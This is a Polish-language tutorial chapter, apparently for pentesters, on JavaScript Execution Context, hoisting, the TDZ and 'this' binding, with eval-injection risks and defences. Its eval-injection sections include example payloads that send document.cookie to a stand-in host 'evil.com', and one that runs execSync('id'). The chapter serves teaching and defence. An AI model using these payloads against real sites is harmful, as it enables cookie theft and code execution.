# Rozdział 2: Execution Context

## 1. Czym jest Execution Context

**Execution Context** (kontekst wykonania) to abstrakcyjna struktura danych tworzona przez silnik JavaScript za każdym razem, gdy wykonuje kod. Przechowuje wszystkie informacje potrzebne do wykonania danego fragmentu kodu: zmienne, funkcje, wartość `this`, referencję do zewnętrznego scope'u.

Execution Context nie jest obiektem dostępnym dla programisty — istnieje wewnętrznie w silniku. Nie można go "zobaczyć" ani "dotknąć" w kodzie. Ale każde zachowanie JavaScript — hoisting, closures, wartość `this` — wynika bezpośrednio z tego, jak Execution Context działa.

### Trzy rodzaje Execution Context

1. **Global Execution Context (GEC)** — tworzony raz, na samym początku wykonywania skryptu. Istnieje przez cały czas życia strony. Odpowiada globalnemu obiektowi (`window` w przeglądarce, `global` w Node.js).

2. **Function Execution Context (FEC)** — tworzony za każdym razem gdy wywoływana jest funkcja. Niszczy się gdy funkcja zwraca wartość.

3. **Eval Execution Context** — tworzony gdy `eval()` wykonuje kod. Działa jak Function EC, ale ze specyficznymi regułami scope'u. Powód, dla którego `eval` jest niebezpieczny: tworzy własny kontekst z dostępem do otaczającego scope'u.

### Czy jest częścią JavaScript czy Web API

Execution Context to wewnętrzny mechanizm specyfikacji ECMAScript. Jest opisany w standardzie ECMA-262. Nie jest częścią Web API — istnieje w każdym środowisku JavaScript (przeglądarka, Node.js, Deno).

---

## 2. Dlaczego powstał

### Problem: jak śledzić stan wykonania

Wyobraź sobie prosty program:

```javascript
let x = 10;

function add(a, b) {
    let result = a + b;
    return result;
}

let sum = add(x, 5);
```

Gdy silnik wykonuje `add(x, 5)`, musi gdzieś przechować:
- Wartości parametrów `a` i `b`
- Zmienną lokalną `result`
- Wiedzę, gdzie wrócić po zakończeniu funkcji
- Wartość `this` wewnątrz funkcji

Bez Execution Context silnik nie miałby gdzie tych informacji przechować. EC to po prostu "obszar roboczy" dla każdego fragmentu kodu.

### Problem: hoisting i wstępne przetwarzanie

JavaScript zachowuje się inaczej niż większość języków — `var` i deklaracje funkcji są "widoczne" zanim zostanie wykonana linijka, w której je zapisano:

```javascript
console.log(x); // undefined (nie błąd!)
var x = 5;

myfunc(); // działa! (funkcja jest "hoistowana")
function myfunc() { return 42; }
```

To możliwe właśnie dlatego, że tworzenie EC ma dwie fazy — w pierwszej silnik skanuje kod i zbiera informacje o deklaracjach, zanim zacznie go wykonywać.

---

## 3. Jak działa

### Dwie fazy tworzenia Execution Context

Każdy Execution Context przechodzi przez dwie fazy:

#### Faza 1: Creation Phase (faza tworzenia)

Silnik skanuje kod i:

1. Tworzy **Variable Environment** — kontener na zmienne
2. Tworzy **Lexical Environment** — kontener na zmienne `let`/`const` i funkcje
3. Ustala wartość **`this`**
4. Wykonuje **hoisting** — rejestruje deklaracje zmiennych i funkcji

Podczas hoistingu:
- Deklaracje `var` są rejestrowane i ustawiane na `undefined`
- Deklaracje `function` są rejestrowane i od razu przypisywana im jest pełna funkcja
- Deklaracje `let`/`const` są rejestrowane, ale *nie* inicjalizowane — trafiają do **Temporal Dead Zone (TDZ)**

#### Faza 2: Execution Phase (faza wykonania)

Silnik wykonuje kod linijka po linijce:
- Przypisuje wartości zmiennym
- Wywołuje funkcje (tworząc dla nich nowe EC)
- Wykonuje obliczenia

### Diagram przepływu

```
Wywołanie skryptu / funkcji
         │
         ▼
┌─────────────────────────────────────┐
│        CREATION PHASE               │
│                                     │
│  1. Utwórz Variable Environment     │
│  2. Utwórz Lexical Environment      │
│  3. Ustal this                      │
│  4. Hoisting:                       │
│     - var → zarejestruj jako undef  │
│     - function → zarejestruj pełną  │
│     - let/const → TDZ               │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│        EXECUTION PHASE              │
│                                     │
│  Wykonuj kod linia po linii:        │
│  - Przypisuj wartości zmiennym      │
│  - Wywołuj funkcje (nowe EC)        │
│  - Ewaluuj wyrażenia                │
└─────────────────────────────────────┘
```

### Struktura Execution Context w ECMAScript

Specyfikacja definiuje EC jako obiekt zawierający:

```
ExecutionContext {
    code evaluation state,   // stan wykonania (dla generatorów/async)
    Function,                // aktualnie wykonywana funkcja (lub null dla global)
    Realm,                   // realm (zestaw wbudowanych obiektów)
    LexicalEnvironment,      // gdzie szukać zmiennych let/const/function
    VariableEnvironment,     // gdzie szukać zmiennych var
    PrivateEnvironment       // dla private fields klas (ES2022+)
}
```

### Temporal Dead Zone (TDZ)

`let` i `const` są hoistowane (EC wie o ich istnieniu), ale nie można ich użyć przed deklaracją:

```javascript
console.log(x); // ReferenceError: Cannot access 'x' before initialization
let x = 5;
```

Okres między początkiem bloku a linijką deklaracji to **Temporal Dead Zone**. TDZ to mechanizm bezpieczeństwa — wymusza pisanie kodu gdzie zmienne są używane po deklaracji.

---

## 4. Co dzieje się wewnętrznie

### Lexical Environment — szczegóły

**Lexical Environment** to para:
1. **Environment Record** — właściwy kontener na zmienne (mapa nazwa → wartość)
2. **Outer reference** — referencja do zewnętrznego Lexical Environment (tworzy łańcuch scope'ów)

Typy Environment Record:
- **Global Environment Record** — dla globalnego kontekstu (zawiera `window`)
- **Object Environment Record** — dla `with` statements i globalnego scope'u
- **Function Environment Record** — dla funkcji (zawiera `arguments`, `this`)
- **Module Environment Record** — dla modułów ES6
- **Declarative Environment Record** — dla bloków `{}`, `catch`, `for`

### Jak silnik szuka zmiennej

Gdy kod odwołuje się do zmiennej `x`, silnik:

1. Szuka w bieżącym Environment Record → jeśli znalazł: return
2. Przechodzi przez Outer reference do zewnętrznego LE → szuka tam
3. Powtarza aż do Global LE
4. Jeśli nie znalazł w Global → ReferenceError

Ten proces to **scope chain lookup** (rozdział 4 o Scope).

### Wartość `this`

Wartość `this` jest ustalana podczas Creation Phase. Zależy od sposobu wywołania funkcji:

```
Wywołanie                          this
──────────────────────────────     ──────────────────────────
Globalne (non-strict)              window (przeglądarka)
Globalne (strict mode)             undefined
Metoda obiektu obj.fn()            obj
Konstruktor new fn()               nowo tworzony obiekt
arrow function                     this z zewnętrznego EC
fn.call(ctx)                       ctx
fn.apply(ctx)                      ctx
fn.bind(ctx)()                     ctx
Event listener (klasyczny)         element DOM, na którym zdarzenie
```

---

## 5. Analogiczny przykład z życia

Wyobraź sobie projekt budowlany:

- Każdy **Execution Context** to osobna budowa (plac budowy)
- **Creation Phase** to etap planowania: architekt sprawdza projekty, zamawia materiały, przydziela pracowników stanowiska (hoisting)
- **Execution Phase** to właściwa budowa: murowanie ścian, układanie instalacji (wykonywanie kodu)
- **Lexical Environment** to skrzynka narzędziowa każdego pracownika — wewnątrz jego narzędzia, na zewnątrz może sięgnąć do skrzynki majstra
- **`this`** to "do jakiej budowy należę teraz" — robotnik może pracować na wielu budowach, ale w danej chwili wie, którą buduje

Gdy projekt budowlany (funkcja) się kończy, plac budowy jest sprzątany (EC niszczony). Ale jeśli zostawiono pododdział (closure), skrzynka narzędziowa jest zachowana.

---

## 6. Przykład kodu

```javascript
// === Globalny Execution Context (tworzony automatycznie) ===

var globalVar = "global"; // hoistowany jako undefined, potem przypisany

function outer() {           // hoistowana jako pełna funkcja
    // === Function Execution Context dla outer() ===
    
    var outerVar = "outer";  // hoistowany jako undefined w FEC outer
    
    function inner() {
        // === Function Execution Context dla inner() ===
        
        var innerVar = "inner";
        
        // Dostęp do zmiennych przez scope chain:
        console.log(innerVar);  // "inner" — w bieżącym EC
        console.log(outerVar);  // "outer" — w EC outer (outer reference)
        console.log(globalVar); // "global" — w Global EC
    }
    
    inner(); // tworzy nowy FEC, umieszcza na Call Stack
}

outer(); // tworzy nowy FEC, umieszcza na Call Stack
```

**Przebieg krok po kroku:**

1. **Global EC — Creation Phase:**
   - `globalVar` → zarejestrowane, wartość `undefined`
   - `outer` → zarejestrowane, wartość: pełna funkcja
   - `this` → `window`

2. **Global EC — Execution Phase:**
   - Linia `var globalVar = "global"` → przypisanie "global" do `globalVar`
   - Linia `outer()` → wywołanie funkcji → tworzenie nowego EC

3. **outer() EC — Creation Phase:**
   - `outerVar` → zarejestrowane, wartość `undefined`
   - `inner` → zarejestrowane, wartość: pełna funkcja
   - `this` → `window` (niemetodyczne wywołanie)
   - `outer reference` → Global EC (bo outer jest zdefiniowany globalnie)

4. **outer() EC — Execution Phase:**
   - `outerVar = "outer"` → przypisanie
   - `inner()` → wywołanie, tworzenie nowego EC

5. **inner() EC — Creation Phase:**
   - `innerVar` → zarejestrowane, wartość `undefined`
   - `outer reference` → EC outer() (bo inner jest zdefiniowany w outer)
   - `this` → `window`

6. **inner() EC — Execution Phase:**
   - `innerVar = "inner"` → przypisanie
   - `console.log(innerVar)` → szuka w bieżącym EC → znalazł → "inner"
   - `console.log(outerVar)` → szuka w bieżącym → nie ma → szuka w outer EC → znalazł → "outer"
   - `console.log(globalVar)` → nie w inner, nie w outer → w global → "global"
   - Funkcja kończy → EC inner jest niszczony

7. outer() i global EC kończą w analogiczny sposób.

---

## 7. Przykład z prawdziwej aplikacji

### Framework React — hook useState

```javascript
// React wewnętrznie zarządza EC dla hooków
function UserProfile({ userId }) {
    // Każde renderowanie tworzy nowy FEC dla UserProfile
    // React przechowuje stan POZA EC — dlatego useState "pamięta" wartości
    const [user, setUser] = useState(null);
    
    useEffect(() => {
        // Callback useEffect to osobny FEC
        // Closure na userId z zewnętrznego EC (UserProfile)
        fetch(`/api/users/${userId}`)
            .then(r => r.json())
            .then(data => setUser(data));
    }, [userId]);
    
    return user ? <div>{user.name}</div> : <div>Loading...</div>;
}
```

Dla pentestera: `userId` pochodzi z props (danych zewnętrznych). Jeśli jest używany w template strings do budowania URL, może prowadzić do Path Traversal.

### Panel admina — dynamic code

```javascript
// Niebezpieczny wzorzec spotykany w legacy code
function evaluateFormula(formula, context) {
    // Tworzenie nowego EC przez eval z dostępem do bieżącego scope
    // context zawiera dane z formularza użytkownika
    with (context) {
        return eval(formula); // PODATNOŚĆ: eval w FEC z dostępem do outer scope
    }
}

// Atakujący może wstrzyknąć do formula:
// "window.location = 'https://evil.com/?c=' + document.cookie"
```

### Aplikacja SPA — this binding bug

```javascript
class PaymentForm {
    constructor() {
        this.cardNumber = "";
        // Błąd: stracenie "this" przez callback
        document.querySelector("#card").addEventListener(
            "change", 
            this.handleCardChange // this będzie HTMLElement, nie PaymentForm!
        );
    }
    
    handleCardChange(event) {
        this.cardNumber = event.target.value; // TypeError lub niezamierzone zachowanie
    }
}
```

---

## 8. Typowe błędy programistów

### Błąd 1: Poleganie na hoistingu var

```javascript
// Pozornie ok, ale var jest hoistowany — to zły styl
function calculate() {
    if (condition) {
        var result = compute();
    }
    return result; // undefined jeśli condition == false, nie ReferenceError
}
// Używaj let/const — wyrzuca ReferenceError zamiast cichego undefined
```

### Błąd 2: Utrata `this` w callbackach

```javascript
class Timer {
    constructor() {
        this.seconds = 0;
    }
    
    start() {
        // Zły: this wewnątrz callbacka to window (lub undefined w strict)
        setInterval(function() {
            this.seconds++; // błąd!
        }, 1000);
        
        // Dobry: arrow function nie tworzy własnego this
        setInterval(() => {
            this.seconds++; // this z zewnętrznego EC (Timer instance)
        }, 1000);
    }
}
```

### Błąd 3: TDZ - zaskakujące błędy

```javascript
let x = 1;

function example() {
    console.log(x); // ReferenceError! — nie "1"
    // Silnik widzi let x w tej funkcji (hoisting) → TDZ
    let x = 2;
}
```

### Błąd 4: Eval Injection przez dynamic EC

```javascript
// Niebezpieczne: eval tworzy EC z dostępem do bieżącego scope
function processTemplate(template, vars) {
    return eval("`" + template + "`"); // template literals przez eval
}

// Atakujący kontrolując template może:
// template = "${require('child_process').execSync('id')}" (Node.js)
// template = "${window.location='evil.com/'+document.cookie}"
```

---

## 9. Znaczenie dla bezpieczeństwa

### Scope Isolation jako granica bezpieczeństwa

Execution Contexts i ich scope są fundamentem izolacji kodu. Każdy EC ma własny scope — zmienne zdefiniowane w funkcji nie są dostępne poza nią. To podstawowy mechanizm hermetyzacji.

Ale EC nie zapewnia pełnej izolacji:
- Closures "pamiętają" EC z zewnątrz
- Globalne zmienne (`window.*`) są dostępne z każdego EC
- Prototype Chain może przebijać się przez granice obiektów

### eval() jako wektor ataku

`eval()` tworzy nowy EC w bieżącym scope — to "dziura" w izolacji. Jeśli atakujący kontroluje argument `eval()`:

```javascript
// Atak Eval Injection
function runQuery(userQuery) {
    // NIGDY tak nie rób
    const result = eval(`db.query("${userQuery}")`);
}
// Payload: "); document.location='evil.com/?c='+document.cookie; db.query("
```

**CWE-95** — Improper Neutralization of Directives in Dynamically Evaluated Code

### Dynamic Function Creation

`new Function(body)` tworzy funkcję w Global EC (nie bieżącym), co jest nieco bezpieczniejsze niż `eval`, ale nadal podatne:

```javascript
const fn = new Function("return " + userInput);
// Działa w globalnym EC — dostęp do window, document etc.
```

### `with` Statement i zaciemnianie scope

`with` modyfikuje Lexical Environment, prepopulując scope obiektem. Utrudnia analizę statyczną i może prowadzić do nieoczekiwanych powiązań:

```javascript
with (userObject) {
    eval(expression); // scope zawiera właściwości userObject
}
```

### Powiązane CWE

- **CWE-95** — Eval Injection
- **CWE-665** — Improper Initialization (TDZ-related bugs)
- **CWE-470** — Use of Externally-Controlled Input to Select Classes or Code

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Sources → Breakpoints

1. Otwórz **Sources** → znajdź interesujący plik JS
2. Kliknij numer linii → ustaw breakpoint
3. Trigger akcji w aplikacji → wykonanie zatrzyma się
4. W panelu **Scope** po prawej zobaczysz:
   - **Local** — zmienne w bieżącym FEC
   - **Closure** — zmienne z zewnętrznych EC (closures)
   - **Global** — właściwości window
   - **Script** — zmienne module-level

```
DevTools → Sources → (wybierz plik) → (kliknij numer linii)
                                    → panel Scope po prawej:
                                    
    ▼ Local
        this: Window
        result: "admin_token_abc123"
    ▼ Closure (processAuth)
        authKey: "secret_key"
    ▼ Global
        window: Window {...}
```

### Szukanie eval i podobnych

Użyj globalnego wyszukiwania w DevTools (Ctrl+Shift+F):

```
eval(
new Function(
with (
document.write(
innerHTML =
```

### Identyfikacja TDZ bugów

TDZ bugi ujawniają się jako `ReferenceError` w konsoli z komunikatem "Cannot access '...' before initialization".

### Szukanie wycieków przez this

W konsoli:
```javascript
// Sprawdź co jest dostępne jako this w callbackach eventów
document.addEventListener("click", function() {
    console.log(this); // Element DOM
    // Sprawdź: czy handler ma dostęp do wrażliwych danych przez closure?
});
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy aplikacja używa eval() z danymi wejściowymi użytkownika?
□ Czy używa new Function() z zewnętrznymi danymi?
□ Czy używa with() — utrudnia analizę scope i audit bezpieczeństwa?
□ Czy zmienne z wrażliwymi danymi (tokeny, klucze) są w globalnym scope?
□ Czy DevTools Scope panel ujawnia wrażliwe dane w closures?
□ Czy błędy TDZ (ReferenceError) są odpowiednio obsługiwane?
□ Czy wartość this jest poprawnie bindowana w callbackach (brak przypadkowych wycieków)?
□ Czy dynamicznie tworzone EC (eval, new Function) są audytowane?
□ Czy "use strict" jest stosowany — eliminuje niektóre niebezpieczne zachowania?
□ Czy kod kliencki nie zawiera logiki autoryzacji opartej wyłącznie na EC/scope?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz: Eval Injection przez template

**Wymagania:** Aplikacja dynamicznie generuje i wykonuje JavaScript na podstawie danych użytkownika.

**Warunki:** Funkcja `eval()` lub `new Function()` otrzymuje dane wejściowe bez sanityzacji.

**Przebieg:**
1. Pentester identyfikuje miejsce, gdzie aplikacja buduje ciąg znaków do eval'a
2. Identyfikuje wektor wejściowy (parametr URL, pole formularza, cookie)
3. Testuje breakout payload — próbuje wyjść z ciągu znaków i wstrzyknąć własny kod
4. Weryfikuje wykonanie przez obserwację efektów lub błędów w konsoli

**Identyfikacja:** Szukaj `eval(` w Sources. Sprawdź co jest argumentem — czy pochodzi z zewnątrz?

**Ograniczenia:** CSP `script-src 'self'` bez `'unsafe-eval'` zablokuje eval.

**Wpływ:** Pełne wykonanie kodu JavaScript w kontekście strony.

### Scenariusz: Scope Leakage przez błędne this binding

**Wymagania:** Brak. To błąd programistyczny, nie atak.

**Warunki:** Aplikacja przekazuje metody instancji jako callbacki bez bindowania this.

**Przebieg:**
1. Pentester znajduje handler zdarzeń przekazujący metodę instancji
2. Trigger zdarzenia — this jest elementem DOM, nie klasą
3. Wewnętrzna logika przetwarza `this.property` → undefined → pominięcie walidacji
4. Obejście walidacji bezpieczeństwa

---

## 13. Jak się zabezpieczać

### Eliminuj eval()

```javascript
// Zamiast: eval(userExpression)
// Użyj bezpiecznych alternatyw:

// Opcja 1: Biała lista dozwolonych operacji
const ALLOWED_OPS = {
    'add': (a, b) => a + b,
    'multiply': (a, b) => a * b
};
const result = ALLOWED_OPS[operation]?.(x, y);

// Opcja 2: JSON.parse dla danych (nie kodu)
const data = JSON.parse(userInput); // bezpieczne dla danych

// Opcja 3: Biblioteka wyrażeń matematycznych zamiast eval
// np. mathjs, expr-eval
```

### Używaj strict mode

```javascript
"use strict"; // na początku pliku lub funkcji

// W strict mode:
// - brak domyślnego globalnego this
// - this w zwykłych funkcjach to undefined (nie window)
// - zakaz z with()
// - zmienne niezadeklarowane powodują błąd (zamiast tworzyć globalne)
```

### Hermetyzuj przez moduły ES6

```javascript
// auth.mjs — moduł ES6
// Wszystkie zmienne są domyślnie lokalne dla modułu
const SECRET_KEY = "..."; // niewidoczne z zewnątrz

export function authenticate(token) {
    // SECRET_KEY dostępny przez closure modułu, nie przez window.SECRET_KEY
    return verify(token, SECRET_KEY);
}
```

### let/const zamiast var

```javascript
// Var: function-scoped, hoistowany, brak TDZ
// let/const: block-scoped, hoistowany z TDZ, bezpieczniejszy

// Zawsze preferuj:
const immutableValue = 42;
let mutableValue = 0;
// Nigdy (poza legacy code): var x = ...
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Execution Context to wewnętrzna struktura silnika JS — niewidoczna dla programisty, ale determinuje każde zachowanie języka
2. EC składa się z Lexical Environment, Variable Environment i wartości `this`
3. Tworzenie EC ma dwie fazy: Creation (hoisting) i Execution (wykonanie)
4. Hoisting `var` daje `undefined`, hoisting `let`/`const` daje TDZ
5. `eval()` tworzy nowy EC z dostępem do bieżącego scope — to wektor ataku

**Najczęstsze nieporozumienia:**

- "Hoisting przenosi kod na górę pliku" — NIE. Kod pozostaje w miejscu. Tylko referencja do zmiennej/funkcji jest znana wcześniej w EC.
- "let i const nie są hoistowane" — są hoistowane (EC wie o nich), ale nie inicjalizowane (TDZ).
- "this zawsze wskazuje na klasę/obiekt" — this zależy od sposobu wywołania, nie miejsca definicji.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools → Sources → dowolny plik JS → breakpoint → panel Scope** — widzisz aktualny EC
2. **Console → `(function() { debugger; })()`** — zatrzymuje wykonanie, scope jest widoczny
3. Szukaj w Sources: `eval(`, `with (`, `new Function(` — potencjalne sinks
4. W Console: `window.x = 1; (function() { var x = 2; console.log(window.x); })()` — testuj izolację scope

---

## Powiązania

```
Execution Context
        │
        ├──► Call Stack (Rozdział 3)
        │         EC są układane na stosie przy każdym wywołaniu funkcji
        │
        ├──► Scope (Rozdział 4)
        │         Lexical Environment EC tworzy łańcuch scope'ów
        │
        ├──► Closures (Rozdział 5)
        │         Closure = funkcja + referencja do EC rodzica
        │
        └──► Prototype Chain (Rozdział 6)
                  this binding w EC determinuje dostęp do łańcucha prototypów
```
